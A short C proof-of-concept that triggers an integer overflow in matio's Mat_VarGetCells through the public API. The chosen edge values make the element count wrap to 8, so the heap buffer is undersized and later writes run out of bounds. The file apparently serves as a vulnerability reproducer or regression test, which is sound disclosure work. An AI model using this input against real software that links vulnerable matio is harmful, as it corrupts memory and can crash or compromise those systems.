/* PoC: integer overflow in Mat_VarGetCells leads to undersized heap
 * allocation and a subsequent out-of-bounds heap write, reached entirely
 * through matio's public API (matio.h).
 */
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
    size_t dims[2] = {20, 1};
    matvar_t *matvar;
    int start[2] = {0, 0};
    int stride[2] = {1, 1};
    int edge[2];
    matvar_t **cells;

    matvar = Mat_VarCreate("c", MAT_C_CELL, MAT_T_CELL, 2, dims, NULL, 0);
    if ( matvar == NULL ) {
        fprintf(stderr, "Mat_VarCreate failed\n");
        return 1;
    }

    /* edge[0] * edge[1] = 536870913 * 8 = 4294967304 = 2^32 + 8, which
     * truncates to 8 when narrowed to a 32-bit int element count. The
     * output buffer is then allocated for 8 pointers, but the inner loop
     * iterates edge[0] (536870913) times, writing far past the buffer.
     */
    edge[0] = 536870913;
    edge[1] = 8;

    cells = Mat_VarGetCells(matvar, start, stride, edge);

    /* Not reached on a safe build: Mat_VarGetCells should reject the
     * out-of-range edge product before writing out of bounds. */
    free(cells);
    Mat_VarFree(matvar);
    return 0;
}
